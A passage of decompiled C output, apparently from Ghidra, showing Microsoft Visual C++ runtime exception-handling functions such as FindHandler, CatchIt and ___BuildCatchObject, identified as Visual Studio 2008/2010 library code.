    *(undefined4 *)(param_2 + 0x24) = 1;
    return 1;
  }
  ___InternalCxxFrameHandler
            (param_1,*(EHRegistrationNode **)(param_2 + 0x10),(_CONTEXT *)param_3,(void *)0x0,
             *(_s_FuncInfo **)(param_2 + 0xc),*(int *)(param_2 + 0x14),
             *(EHRegistrationNode **)(param_2 + 0x18),'\x01');
  if (*(int *)(param_2 + 0x24) == 0) {
    _UnwindNestedFrames((EHRegistrationNode *)param_2,param_1);
  }
  _CallSETranslator((EHExceptionRecord *)0x123,(EHRegistrationNode *)&local_8,(void *)0x0,
                    (void *)0x0,(_s_FuncInfo *)0x0,0,(EHRegistrationNode *)0x0);
                    /* WARNING: Could not recover jumptable at 0x004131b0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _Var1 = (*local_8)();
  return _Var1;
}



/* Function: _GetRangeOfTrysToCheck */

/* Library Function - Single Match
    struct _s_TryBlockMapEntry const * __cdecl _GetRangeOfTrysToCheck(struct _s_FuncInfo const
   *,int,int,unsigned int *,unsigned int *)
   
   Library: Visual Studio 2010 Release */

_s_TryBlockMapEntry * __cdecl
_GetRangeOfTrysToCheck(_s_FuncInfo *param_1,int param_2,int param_3,uint *param_4,uint *param_5)

{
  TryBlockMapEntry *pTVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  
  pTVar1 = param_1->pTryBlockMap;
  uVar5 = param_1->nTryBlocks;
  uVar2 = uVar5;
  uVar3 = uVar5;
  while (uVar4 = uVar2, -1 < param_2) {
    if (uVar5 == 0xffffffff) {
      _inconsistency();
    }
    uVar5 = uVar5 - 1;
    if (((pTVar1[uVar5].tryHigh < param_3) && (param_3 <= pTVar1[uVar5].catchHigh)) ||
       (uVar2 = uVar4, uVar5 == 0xffffffff)) {
      param_2 = param_2 + -1;
      uVar2 = uVar5;
      uVar3 = uVar4;
    }
  }
  uVar5 = uVar5 + 1;
  *param_4 = uVar5;
  *param_5 = uVar3;
  if ((param_1->nTryBlocks < uVar3) || (uVar3 < uVar5)) {
    _inconsistency();
  }
  return pTVar1 + uVar5;
}



/* Function: __CreateFrameInfo */

/* Library Function - Single Match
    __CreateFrameInfo
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

undefined4 * __cdecl __CreateFrameInfo(undefined4 *param_1,undefined4 param_2)

{
  _ptiddata p_Var1;
  
  *param_1 = param_2;
  p_Var1 = __getptd();
  param_1[1] = p_Var1->_pFrameInfoChain;
  p_Var1 = __getptd();
  p_Var1->_pFrameInfoChain = param_1;
  return param_1;
}



/* Function: __IsExceptionObjectToBeDestroyed */

/* Library Function - Single Match
    __IsExceptionObjectToBeDestroyed
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

undefined4 __cdecl __IsExceptionObjectToBeDestroyed(int param_1)

{
  _ptiddata p_Var1;
  int *piVar2;
  
  p_Var1 = __getptd();
  piVar2 = (int *)p_Var1->_pFrameInfoChain;
  while( true ) {
    if (piVar2 == (int *)0x0) {
      return 1;
    }
    if (*piVar2 == param_1) break;
    piVar2 = (int *)piVar2[1];
  }
  return 0;
}



/* Function: __FindAndUnlinkFrame */

/* Library Function - Single Match
    __FindAndUnlinkFrame
   
   Library: Visual Studio 2010 Release */

void __cdecl __FindAndUnlinkFrame(void *param_1)

{
  void *pvVar1;
  _ptiddata p_Var2;
  void *pvVar3;
  
  p_Var2 = __getptd();
  if (param_1 == p_Var2->_pFrameInfoChain) {
    p_Var2 = __getptd();
    p_Var2->_pFrameInfoChain = *(void **)((int)param_1 + 4);
  }
  else {
    p_Var2 = __getptd();
    pvVar1 = p_Var2->_pFrameInfoChain;
    do {
      pvVar3 = pvVar1;
      if (*(int *)((int)pvVar3 + 4) == 0) {
        _inconsistency();
        return;
      }
      pvVar1 = *(void **)((int)pvVar3 + 4);
    } while (param_1 != *(void **)((int)pvVar3 + 4));
    *(undefined4 *)((int)pvVar3 + 4) = *(undefined4 *)((int)param_1 + 4);
  }
  return;
}



/* Function: _CallCatchBlock2 */

/* Library Function - Single Match
    void * __cdecl _CallCatchBlock2(struct EHRegistrationNode *,struct _s_FuncInfo const *,void
   *,int,unsigned long)
   
   Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release */

void * __cdecl
_CallCatchBlock2(EHRegistrationNode *param_1,_s_FuncInfo *param_2,void *param_3,int param_4,
                ulong param_5)

{
  void *pvVar1;
  void *local_1c;
  code *local_18;
  uint local_14;
  _s_FuncInfo *local_10;
  EHRegistrationNode *local_c;
  int local_8;
  
  local_14 = DAT_004191b4 ^ (uint)&local_1c;
  local_10 = param_2;
  local_8 = param_4 + 1;
  local_18 = CatchGuardHandler;
  local_c = param_1;
  local_1c = ExceptionList;
  ExceptionList = &local_1c;
  pvVar1 = (void *)__CallSettingFrame_12(param_3,param_1,param_5);
  ExceptionList = local_1c;
  return pvVar1;
}



/* Function: FUN_0041333b */

exception * __thiscall FUN_0041333b(void *this,byte param_1)

{
  *(undefined ***)this = std::bad_exception::vftable;
  FUN_00406fb2((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_004069ca(this);
  }
  return (exception *)this;
}



/* Function: ___TypeMatch */

/* Library Function - Single Match
    ___TypeMatch
   
   Library: Visual Studio 2010 Release */

undefined4 __cdecl ___TypeMatch(byte *param_1,byte *param_2,uint *param_3)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = *(int *)(param_1 + 4);
  if ((iVar1 == 0) || (*(char *)(iVar1 + 8) == '\0')) {
LAB_004133ba:
    uVar2 = 1;
  }
  else {
    if (iVar1 == *(int *)(param_2 + 4)) {
LAB_00413399:
      if (((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&
          (((*param_3 & 1) == 0 || ((*param_1 & 1) != 0)))) &&
         (((*param_3 & 2) == 0 || ((*param_1 & 2) != 0)))) goto LAB_004133ba;
    }
    else {
      iVar1 = _strcmp((char *)(iVar1 + 8),(char *)(*(int *)(param_2 + 4) + 8));
      if (iVar1 == 0) goto LAB_00413399;
    }
    uVar2 = 0;
  }
  return uVar2;
}



/* Function: ___FrameUnwindFilter */

/* Library Function - Single Match
    ___FrameUnwindFilter
   
   Library: Visual Studio 2010 Release */

undefined4 __cdecl ___FrameUnwindFilter(undefined4 *param_1)

{
  int iVar1;
  _ptiddata p_Var2;
  undefined4 extraout_EAX;
  
  iVar1 = *(int *)*param_1;
  if ((iVar1 == -0x1fbcbcae) || (iVar1 == -0x1fbcb0b3)) {
    p_Var2 = __getptd();
    if (0 < p_Var2->_ProcessingThrow) {
      p_Var2 = __getptd();
      p_Var2->_ProcessingThrow = p_Var2->_ProcessingThrow + -1;
    }
  }
  else if (iVar1 == -0x1f928c9d) {
    p_Var2 = __getptd();
    p_Var2->_ProcessingThrow = 0;
    terminate();
    return extraout_EAX;
  }
  return 0;
}



/* Function: ___FrameUnwindToState */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    ___FrameUnwindToState
   
   Library: Visual Studio 2010 Release */

void __cdecl ___FrameUnwindToState(int param_1,undefined4 param_2,int param_3,int param_4)

{
  _ptiddata p_Var1;
  int iVar2;
  int iVar3;
  
  if (*(int *)(param_3 + 4) < 0x81) {
    iVar2 = (int)*(char *)(param_1 + 8);
  }
  else {
    iVar2 = *(int *)(param_1 + 8);
  }
  p_Var1 = __getptd();
  p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + 1;
  while (iVar3 = iVar2, iVar3 != param_4) {
    if ((iVar3 < 0) || (*(int *)(param_3 + 4) <= iVar3)) {
      _inconsistency();
    }
    iVar2 = *(int *)(*(int *)(param_3 + 8) + iVar3 * 8);
    if (*(int *)(*(int *)(param_3 + 8) + 4 + iVar3 * 8) != 0) {
      *(int *)(param_1 + 8) = iVar2;
      __CallSettingFrame_12(*(undefined4 *)(*(int *)(param_3 + 8) + 4 + iVar3 * 8),param_1,0x103);
    }
  }
  FUN_004134d2();
  if (iVar3 != param_4) {
    _inconsistency();
  }
  *(int *)(param_1 + 8) = iVar3;
  return;
}



/* Function: FUN_004134d2 */

void FUN_004134d2(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if (0 < p_Var1->_ProcessingThrow) {
    p_Var1 = __getptd();
    p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + -1;
  }
  return;
}



/* Function: FUN_004134ec */

undefined4 FUN_004134ec(void)

{
  int *piVar1;
  int iVar2;
  int *in_EAX;
  _ptiddata p_Var3;
  
  piVar1 = (int *)*in_EAX;
  if ((((*piVar1 == -0x1f928c9d) && (piVar1[4] == 3)) &&
      ((iVar2 = piVar1[5], iVar2 == 0x19930520 || ((iVar2 == 0x19930521 || (iVar2 == 0x19930522)))))
      ) && (piVar1[7] == 0)) {
    p_Var3 = __getptd();
    (p_Var3->_setloc_data)._cacheout[0x27] = L'\x01';
    (p_Var3->_setloc_data)._cacheout[0x28] = L'\0';
    return 1;
  }
  return 0;
}



/* Function: ___DestructExceptionObject */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    ___DestructExceptionObject
   
   Library: Visual Studio 2010 Release */

void __cdecl ___DestructExceptionObject(int *param_1)

{
  undefined *UNRECOVERED_JUMPTABLE;
  
  if ((((param_1 != (int *)0x0) && (*param_1 == -0x1f928c9d)) && (param_1[7] != 0)) &&
     (UNRECOVERED_JUMPTABLE = *(undefined **)(param_1[7] + 4),
     UNRECOVERED_JUMPTABLE != (undefined *)0x0)) {
    FID_conflict__CallMemberFunction1(param_1[6],UNRECOVERED_JUMPTABLE);
  }
  return;
}



/* Function: ___AdjustPointer */

/* Library Function - Single Match
    ___AdjustPointer
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

int __cdecl ___AdjustPointer(int param_1,int *param_2)

{
  int iVar1;
  
  iVar1 = *param_2 + param_1;
  if (-1 < param_2[1]) {
    iVar1 = iVar1 + *(int *)(*(int *)(param_2[1] + param_1) + param_2[2]) + param_2[1];
  }
  return iVar1;
}



/* Function: IsInExceptionSpec */

/* Library Function - Single Match
    unsigned char __cdecl IsInExceptionSpec(struct EHExceptionRecord *,struct _s_ESTypeList const *)
   
   Library: Visual Studio 2010 Release */

uchar __cdecl IsInExceptionSpec(EHExceptionRecord *param_1,_s_ESTypeList *param_2)

{
  int iVar1;
  int iVar2;
  int *piVar3;
  int *unaff_EDI;
  int local_c;
  uchar local_5;
  
  if (unaff_EDI == (int *)0x0) {
    _inconsistency();
    terminate();
  }
  local_c = 0;
  local_5 = '\0';
  if (0 < *unaff_EDI) {
    do {
      piVar3 = *(int **)(*(int *)(param_1 + 0x1c) + 0xc);
      iVar2 = *piVar3;
      if (0 < iVar2) {
        do {
          piVar3 = piVar3 + 1;
          iVar1 = ___TypeMatch((byte *)(unaff_EDI[1] + local_c * 0x10),(byte *)*piVar3,
                               *(uint **)(param_1 + 0x1c));
          if (iVar1 != 0) {
            local_5 = '\x01';
            break;
          }
          iVar2 = iVar2 + -1;
        } while (0 < iVar2);
      }
      local_c = local_c + 1;
    } while (local_c < *unaff_EDI);
  }
  return local_5;
}



/* Function: FUN_0041362a */

/* WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3 */

void FUN_0041362a(void *param_1)

{
  code *pcVar1;
  _ptiddata p_Var2;
  
  p_Var2 = __getptd();
  if (p_Var2->_curexcspec != (void *)0x0) {
    _inconsistency();
  }
  FUN_0040c34b();
  terminate();
  p_Var2 = __getptd();
  p_Var2->_curexcspec = param_1;
  __CxxThrowException_8(0,(byte *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* Function: Catch_All@0041365b */

void Catch_All_0041365b(void)

{
  code *pcVar1;
  _ptiddata p_Var2;
  int unaff_EBP;
  
  p_Var2 = __getptd();
  p_Var2->_curexcspec = *(void **)(unaff_EBP + 8);
  __CxxThrowException_8(0,(byte *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* Function: CallCatchBlock */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    void * __cdecl CallCatchBlock(struct EHExceptionRecord *,struct EHRegistrationNode *,struct
   _CONTEXT *,struct _s_FuncInfo const *,void *,int,unsigned long)
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

void * __cdecl
CallCatchBlock(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,
              _s_FuncInfo *param_4,void *param_5,int param_6,ulong param_7)

{
  _ptiddata p_Var1;
  void *in_ECX;
  undefined4 local_40 [2];
  undefined4 local_38;
  void *local_34;
  void *local_30;
  undefined4 *local_2c;
  undefined4 local_28;
  void *local_20;
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_004180d8;
  uStack_c = 0x41367f;
  local_38 = 0;
  local_28 = *(undefined4 *)(param_2 + -4);
  local_2c = __CreateFrameInfo(local_40,*(undefined4 *)(param_1 + 0x18));
  p_Var1 = __getptd();
  local_30 = p_Var1->_curexception;
  p_Var1 = __getptd();
  local_34 = p_Var1->_curcontext;
  p_Var1 = __getptd();
  p_Var1->_curexception = param_1;
  p_Var1 = __getptd();
  p_Var1->_curcontext = param_3;
  local_8 = (undefined *)0x1;
  local_20 = _CallCatchBlock2(param_2,param_4,in_ECX,(int)param_5,param_6);
  local_8 = (undefined *)0xfffffffe;
  FUN_00413799();
  return local_20;
}



/* Function: FUN_00413799 */

void FUN_00413799(void)

{
  _ptiddata p_Var1;
  int iVar2;
  int unaff_EBP;
  int *unaff_ESI;
  int unaff_EDI;
  
  *(undefined4 *)(unaff_EDI + -4) = *(undefined4 *)(unaff_EBP + -0x24);
  __FindAndUnlinkFrame(*(void **)(unaff_EBP + -0x28));
  p_Var1 = __getptd();
  p_Var1->_curexception = *(void **)(unaff_EBP + -0x2c);
  p_Var1 = __getptd();
  p_Var1->_curcontext = *(void **)(unaff_EBP + -0x30);
  if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&
      ((iVar2 = unaff_ESI[5], iVar2 == 0x19930520 ||
       ((iVar2 == 0x19930521 || (iVar2 == 0x19930522)))))) &&
     ((*(int *)(unaff_EBP + -0x34) == 0 && (*(int *)(unaff_EBP + -0x1c) != 0)))) {
    iVar2 = __IsExceptionObjectToBeDestroyed(unaff_ESI[6]);
    if (iVar2 != 0) {
      ___DestructExceptionObject(unaff_ESI);
    }
  }
  return;
}



/* Function: ___BuildCatchObjectHelper */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    ___BuildCatchObjectHelper
   
   Library: Visual Studio 2010 Release */

char __cdecl ___BuildCatchObjectHelper(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  int iVar1;
  void *pvVar2;
  size_t _Size;
  uint in_stack_ffffffd0;
  
  if (((param_3[1] == 0) || (*(char *)(param_3[1] + 8) == '\0')) ||
     ((param_3[2] == 0 && ((*param_3 & 0x80000000) == 0)))) {
    return '\0';
  }
  if (-1 < (int)*param_3) {
    param_2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  if ((*param_3 & 8) == 0) {
    pvVar2 = *(void **)(param_1 + 0x18);
    if ((*param_4 & 1) == 0) {
      if (*(int *)(param_4 + 0x18) == 0) {
        iVar1 = _ValidateRead(pvVar2,1);
        if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
          _Size = *(size_t *)(param_4 + 0x14);
          pvVar2 = (void *)___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
          FID_conflict__memcpy(param_2,pvVar2,_Size);
          return '\0';
        }
      }
      else {
        iVar1 = _ValidateRead(pvVar2,1);
        if (((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) &&
           (iVar1 = _ValidateRead(*(void **)(param_4 + 0x18),in_stack_ffffffd0), iVar1 != 0)) {
          return ((*param_4 & 4) != 0) + '\x01';
        }
      }
    }
    else {
      iVar1 = _ValidateRead(pvVar2,1);
      if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
        FID_conflict__memcpy(param_2,*(void **)(param_1 + 0x18),*(size_t *)(param_4 + 0x14));
        if (*(int *)(param_4 + 0x14) != 4) {
          return '\0';
        }
        iVar1 = *param_2;
        if (iVar1 == 0) {
          return '\0';
        }
        goto LAB_00413894;
      }
    }
  }
  else {
    iVar1 = _ValidateRead(*(void **)(param_1 + 0x18),1);
    if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
      iVar1 = *(int *)(param_1 + 0x18);
      *param_2 = iVar1;
LAB_00413894:
      iVar1 = ___AdjustPointer(iVar1,(int *)(param_4 + 8));
      *param_2 = iVar1;
      return '\0';
    }
  }
  _inconsistency();
  return '\0';
}



/* Function: ___BuildCatchObject */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    ___BuildCatchObject
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

void __cdecl ___BuildCatchObject(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  char cVar1;
  undefined3 extraout_var;
  int *piVar2;
  
  piVar2 = param_2;
  if ((*param_3 & 0x80000000) == 0) {
    piVar2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  cVar1 = ___BuildCatchObjectHelper(param_1,param_2,param_3,param_4);
  if (CONCAT31(extraout_var,cVar1) == 1) {
    ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
    FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
  }
  else if (CONCAT31(extraout_var,cVar1) == 2) {
    ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
    FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
  }
  return;
}



/* Function: CatchIt */

/* Library Function - Single Match
    void __cdecl CatchIt(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
   *,void *,struct _s_FuncInfo const *,struct _s_HandlerType const *,struct _s_CatchableType const
   *,struct _s_TryBlockMapEntry const *,int,struct EHRegistrationNode *,unsigned char)
   
   Library: Visual Studio 2010 Release */

void __cdecl
CatchIt(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
       _s_FuncInfo *param_5,_s_HandlerType *param_6,_s_CatchableType *param_7,
       _s_TryBlockMapEntry *param_8,int param_9,EHRegistrationNode *param_10,uchar param_11)

{
  void *pvVar1;
  uint *unaff_EBX;
  EHRegistrationNode *unaff_ESI;
  int *unaff_EDI;
  EHRegistrationNode *pEVar2;
  
  if (param_5 != (_s_FuncInfo *)0x0) {
    ___BuildCatchObject((int)param_1,(int *)unaff_ESI,unaff_EBX,(byte *)param_5);
  }
  if (param_7 == (_s_CatchableType *)0x0) {
    param_7 = (_s_CatchableType *)unaff_ESI;
  }
  _UnwindNestedFrames((EHRegistrationNode *)param_7,param_1);
  pEVar2 = unaff_ESI;
  ___FrameUnwindToState((int)unaff_ESI,param_3,(int)param_4,*unaff_EDI);
  *(int *)(unaff_ESI + 8) = unaff_EDI[1] + 1;
  pvVar1 = CallCatchBlock(param_1,unaff_ESI,(_CONTEXT *)param_2,(_s_FuncInfo *)param_4,param_6,0x100
                          ,(ulong)pEVar2);
  if (pvVar1 != (void *)0x0) {
    _JumpToContinuation(pvVar1,unaff_ESI);
  }
  return;
}



/* Function: FindHandlerForForeignException */

/* Library Function - Single Match
    void __cdecl FindHandlerForForeignException(struct EHExceptionRecord *,struct EHRegistrationNode
   *,struct _CONTEXT *,void *,struct _s_FuncInfo const *,int,int,struct EHRegistrationNode *)
   
   Library: Visual Studio 2010 Release */

void __cdecl
FindHandlerForForeignException
          (EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
          _s_FuncInfo *param_5,int param_6,int param_7,EHRegistrationNode *param_8)

{
  TypeDescriptor *pTVar1;
  _ptiddata p_Var2;
  void *pvVar3;
  int iVar4;
  _s_TryBlockMapEntry *p_Var5;
  int *piVar6;
  _s_TryBlockMapEntry *unaff_EBX;
  EHRegistrationNode *unaff_ESI;
  int unaff_EDI;
  uint in_stack_fffffff0;
  uint local_8;
  
  if (*(int *)param_1 != -0x7ffffffd) {
    p_Var2 = __getptd();
    if (p_Var2->_translator != (void *)0x0) {
      p_Var2 = __getptd();
      pvVar3 = (void *)FUN_00409846();
      if ((((p_Var2->_translator != pvVar3) && (*(int *)param_1 != -0x1fbcb0b3)) &&
          (*(int *)param_1 != -0x1fbcbcae)) &&
         (iVar4 = _CallSETranslator(param_1,param_2,param_3,param_4,param_5,param_7,param_8),
         iVar4 != 0)) {
        return;
      }
    }
    if (param_5->nTryBlocks == 0) {
      _inconsistency();
    }
    p_Var5 = _GetRangeOfTrysToCheck(param_5,param_7,param_6,&local_8,(uint *)&stack0xfffffff0);
    if (local_8 < in_stack_fffffff0) {
      piVar6 = &p_Var5->nCatches;
      do {
        if ((((_s_TryBlockMapEntry *)(piVar6 + -3))->tryLow <= param_6) && (param_6 <= piVar6[-2]))
        {
          pTVar1 = ((HandlerType *)piVar6[1])[*piVar6 + -1].pType;
          if (((pTVar1 == (TypeDescriptor *)0x0) || (*(char *)&pTVar1[1].pVFTable == '\0')) &&
             ((((HandlerType *)piVar6[1])[*piVar6 + -1].adjectives & 0x40) == 0)) {
            CatchIt(param_1,(EHRegistrationNode *)param_3,(_CONTEXT *)param_4,param_5,
                    (_s_FuncInfo *)0x0,(_s_HandlerType *)param_7,(_s_CatchableType *)param_8,
                    unaff_EBX,unaff_EDI,unaff_ESI,(uchar)in_stack_fffffff0);
          }
        }
        local_8 = local_8 + 1;
        piVar6 = piVar6 + 5;
      } while (local_8 < in_stack_fffffff0);
    }
  }
  return;
}



/* Function: FindHandler */

/* Library Function - Single Match
    void __cdecl FindHandler(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
   *,void *,struct _s_FuncInfo const *,unsigned char,int,struct EHRegistrationNode *)
   
   Library: Visual Studio 2010 Release */

void __cdecl
FindHandler(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
           _s_FuncInfo *param_5,uchar param_6,int param_7,EHRegistrationNode *param_8)

{
  uint uVar1;
  int *piVar2;
  _s_FuncInfo *p_Var3;
  HandlerType **ppHVar4;
  uchar uVar5;
  bool bVar6;
  _ptiddata p_Var7;
  int iVar8;
  _s_TryBlockMapEntry *p_Var9;
  EHRegistrationNode *unaff_EBX;
  _s_FuncInfo *p_Var10;
  _s_FuncInfo *p_Var11;
  HandlerType *pHVar12;
  int unaff_ESI;
  _s_FuncInfo *p_Var13;
  _s_TryBlockMapEntry *unaff_EDI;
  HandlerType **ppHVar14;
  EHRegistrationNode *pEVar15;
  undefined **in_stack_ffffffc8;
  uint local_24;
  HandlerType **local_20;
  int local_1c;
  uint local_18;
  uint local_14;
  HandlerType *local_10;
  int local_c;
  char local_5;
  
  p_Var11 = param_5;
  local_5 = '\0';
  if (param_5->maxState < 0x81) {
    local_c = (int)(char)param_2[8];
  }
  else {
    local_c = *(int *)(param_2 + 8);
  }
  if ((local_c < -1) || (param_5->maxState <= local_c)) {
    _inconsistency();
  }
  p_Var13 = (_s_FuncInfo *)param_1;
  if (*(int *)param_1 != -0x1f928c9d) goto LAB_00413ec6;
  p_Var10 = (_s_FuncInfo *)0x19930520;
  if (*(int *)(param_1 + 0x10) != 3) goto LAB_00413d16;
  iVar8 = *(int *)(param_1 + 0x14);
  if (((iVar8 != 0x19930520) && (iVar8 != 0x19930521)) && (iVar8 != 0x19930522)) goto LAB_00413d16;
  if (*(int *)(param_1 + 0x1c) != 0) goto LAB_00413d16;
  p_Var7 = __getptd();
  if (p_Var7->_curexception != (void *)0x0) {
    p_Var7 = __getptd();
    p_Var13 = (_s_FuncInfo *)p_Var7->_curexception;
    param_1 = (EHExceptionRecord *)p_Var13;
    p_Var7 = __getptd();
    param_3 = (_CONTEXT *)p_Var7->_curcontext;
    iVar8 = _ValidateRead(p_Var13,1);
    if (iVar8 == 0) {
      _inconsistency();
    }
    if ((((p_Var13->magicNumber_and_bbtFlags == 0xe06d7363) &&
         (p_Var13->pTryBlockMap == (TryBlockMapEntry *)0x3)) &&
        ((uVar1 = p_Var13->nIPMapEntries, uVar1 == 0x19930520 ||
         ((uVar1 == 0x19930521 || (uVar1 == 0x19930522)))))) &&
       (p_Var13->pESTypeList == (ESTypeList *)0x0)) {
      _inconsistency();
    }
    p_Var7 = __getptd();
    if (p_Var7->_curexcspec == (void *)0x0) goto LAB_00413d16;
    p_Var7 = __getptd();
    piVar2 = (int *)p_Var7->_curexcspec;
    p_Var7 = __getptd();
    iVar8 = 0;
    p_Var7->_curexcspec = (void *)0x0;
    uVar5 = IsInExceptionSpec(param_1,(_s_ESTypeList *)unaff_EDI);
    p_Var13 = (_s_FuncInfo *)param_1;
    if (uVar5 != '\0') goto LAB_00413d16;
    p_Var11 = (_s_FuncInfo *)0x0;
    if (0 < *piVar2) {
      do {
        bVar6 = type_info::operator==
                          (*(type_info **)((int)&p_Var11->maxState + piVar2[1]),
                           (type_info *)&std::bad_exception::RTTI_Type_Descriptor);
        if (bVar6) goto LAB_00413cda;
        iVar8 = iVar8 + 1;
        p_Var11 = (_s_FuncInfo *)&p_Var11->pTryBlockMap;
      } while (iVar8 < *piVar2);
    }
    do {
      terminate();
LAB_00413cda:
      ___DestructExceptionObject((int *)param_1);
      param_1 = (EHExceptionRecord *)s_bad_exception_00417790;
      std::exception::exception((exception *)&stack0xffffffc8,(char **)&param_1);
      in_stack_ffffffc8 = std::bad_exception::vftable;
      __CxxThrowException_8(&stack0xffffffc8,&DAT_0041813c);
      p_Var10 = p_Var11;
      p_Var13 = (_s_FuncInfo *)param_1;
LAB_00413d16:
      p_Var11 = param_5;
      if (((p_Var13->magicNumber_and_bbtFlags == 0xe06d7363) &&
          (p_Var13->pTryBlockMap == (TryBlockMapEntry *)0x3)) &&
         ((p_Var3 = (_s_FuncInfo *)p_Var13->nIPMapEntries, p_Var3 == p_Var10 ||
          ((p_Var3 == (_s_FuncInfo *)0x19930521 || (p_Var3 == (_s_FuncInfo *)0x19930522)))))) {
        if ((param_5->nTryBlocks != 0) &&
           (p_Var9 = _GetRangeOfTrysToCheck(param_5,param_7,local_c,&local_14,&local_24),
           local_14 < local_24)) {
          ppHVar14 = &p_Var9->pHandlerArray;
          do {
            local_20 = ppHVar14;
            if ((((_s_TryBlockMapEntry *)(ppHVar14 + -4))->tryLow <= local_c) &&
               (local_c <= (int)ppHVar14[-3])) {
              local_10 = *ppHVar14;
              ppHVar4 = ppHVar14;
              for (local_1c = (int)ppHVar14[-1]; local_20 = ppHVar14, 0 < local_1c;
                  local_1c = local_1c + -1) {
                pHVar12 = p_Var13->pESTypeList[1].pTypeArray;
                local_20 = ppHVar4;
                for (local_18 = pHVar12->adjectives; 0 < (int)local_18; local_18 = local_18 - 1) {
                  pHVar12 = (HandlerType *)&pHVar12->pType;
                  p_Var11 = *(_s_FuncInfo **)pHVar12;
                  iVar8 = ___TypeMatch((byte *)local_10,(byte *)p_Var11,(uint *)p_Var13->pESTypeList
                                      );
                  if (iVar8 != 0) {
                    local_5 = '\x01';
                    CatchIt((EHExceptionRecord *)p_Var13,(EHRegistrationNode *)param_3,
                            (_CONTEXT *)param_4,param_5,p_Var11,(_s_HandlerType *)param_7,
                            (_s_CatchableType *)param_8,unaff_EDI,unaff_ESI,unaff_EBX,
                            (uchar)SUB41(in_stack_ffffffc8,0));
                    p_Var13 = (_s_FuncInfo *)param_1;
                    goto LAB_00413e12;
                  }
                }
                local_10 = local_10 + 1;
                ppHVar4 = local_20;
              }
            }
LAB_00413e12:
            local_14 = local_14 + 1;
            ppHVar14 = local_20 + 5;
            p_Var11 = param_5;
            local_20 = ppHVar14;
          } while (local_14 < local_24);
        }
        if (param_6 != '\0') {
          ___DestructExceptionObject((int *)p_Var13);
        }
        if ((((local_5 != '\0') || ((p_Var11->magicNumber_and_bbtFlags & 0x1fffffff) < 0x19930521))
            || (p_Var11->pESTypeList == (ESTypeList *)0x0)) ||
           (uVar5 = IsInExceptionSpec((EHExceptionRecord *)p_Var13,(_s_ESTypeList *)unaff_EDI),
           uVar5 != '\0')) goto LAB_00413ef2;
        __getptd();
        __getptd();
        p_Var7 = __getptd();
        p_Var7->_curexception = p_Var13;
        p_Var7 = __getptd();
        p_Var7->_curcontext = param_3;
        pEVar15 = param_8;
        if (param_8 == (EHRegistrationNode *)0x0) {
          pEVar15 = param_2;
        }
        _UnwindNestedFrames(pEVar15,(EHExceptionRecord *)p_Var13);
        p_Var13 = param_5;
        ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
        FUN_0041362a(p_Var13->pESTypeList);
        p_Var11 = param_5;
      }
LAB_00413ec6:
      if (p_Var11->nTryBlocks == 0) goto LAB_00413ef2;
    } while (param_6 != '\0');
    FindHandlerForForeignException
              ((EHExceptionRecord *)p_Var13,param_2,param_3,param_4,p_Var11,local_c,param_7,param_8)
    ;
LAB_00413ef2:
    p_Var7 = __getptd();
    if (p_Var7->_curexcspec != (void *)0x0) {
      _inconsistency();
    }
  }
